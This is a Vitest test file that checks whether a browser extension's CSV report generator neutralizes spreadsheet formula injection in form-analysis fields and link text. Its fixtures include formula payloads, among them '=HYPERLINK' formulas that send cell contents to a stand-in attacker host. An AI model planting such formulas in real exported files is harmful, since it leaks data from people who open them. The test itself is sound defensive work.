import { describe, it, expect } from 'vitest';
import type { CachedAnalysis } from '../../src/types/analysis';
import type { PdfLink } from '../../src/types/pdf';
import { generateCSVReport } from '../../src/popup/report-generator';
import { captureDownload } from '../helpers/capture-download';
import { columnValue, expectNeutralized, parseCsv } from '../helpers/csv-formula';

const FORM_NAME = '=HYPERLINK("http://attacker.example/x?d="&B2)';
const ENTITY = '+2+2';
const ACTION = '-2-2';
const PURPOSE = '@SUM(A1:A2)';
const VERTICAL = '\t=1+1';
const SIGNER_TIME = '\r=1+1';

describe('popup CSV report', () => {
  it('neutralizes formula triggers in analysis fields written into the report', async () => {
    const analysis = {
      ok: true,
      form_name: FORM_NAME,
      pretty_title: null,
      form_title: null,
      entity_name: ENTITY,
      action_type: ACTION,
      form_purpose: PURPOSE,
      industry_vertical: VERTICAL,
      estimated_signer_time: SIGNER_TIME,
      complexity_score: 2,
      pages: 1,
      _cached_at: 1_700_000_000_000,
      _synced: false,
    } as CachedAnalysis;

    const pdf: PdfLink = {
      url: 'https://example.test/forms/benefits.pdf',
      filename: 'benefits.pdf',
      text: 'Benefits enrollment',
      language_count: 1,
      is_english: true,
      is_implicit: false,
      variations: ['benefits.pdf'],
      action: 'analyze',
    };

    const download = await captureDownload(() => {
      generateCSVReport(new Map([['hash-1', analysis]]), [pdf], () => 'hash-1');
    });

    expect(download.filename).toBe('Form_Analysis_Latest.csv');
    expect(download.type).toContain('text/csv');

    const rows = parseCsv(download.content);
    const record = rows[1];
    expect(record).toBeTruthy();
    expectNeutralized(columnValue(rows, 'Form Name', record!), FORM_NAME);
    expectNeutralized(columnValue(rows, 'Entity Name', record!), ENTITY);
    expectNeutralized(columnValue(rows, 'Action Type', record!), ACTION);
    expectNeutralized(columnValue(rows, 'Form Purpose', record!), PURPOSE);
    expectNeutralized(columnValue(rows, 'Industry Vertical', record!), VERTICAL);
    expectNeutralized(columnValue(rows, 'Estimated Signer Time', record!), SIGNER_TIME);
  });

  it('neutralizes formula link text used as the form name when analysis titles are empty', async () => {
    const linkText = '=HYPERLINK("http://attacker.example/from-link")';
    const analysis = {
      ok: true,
      form_name: '',
      pretty_title: null,
      form_title: null,
      title: '',
      entity_name: 'Example Agency',
      complexity_score: 1,
      pages: 1,
      _cached_at: 1_700_000_000_000,
      _synced: false,
    } as CachedAnalysis;

    const pdf: PdfLink = {
      url: 'https://example.test/forms/notice.pdf',
      filename: 'notice.pdf',
      text: linkText,
      language_count: 1,
      is_english: true,
      is_implicit: false,
      variations: ['notice.pdf'],
      action: 'analyze',
    };

    const download = await captureDownload(() => {
      generateCSVReport(new Map([['hash-2', analysis]]), [pdf], () => 'hash-2');
    });

    const rows = parseCsv(download.content);
    const record = rows[1];
    expect(record).toBeTruthy();
    expectNeutralized(columnValue(rows, 'Form Name', record!), linkText);
  });
});
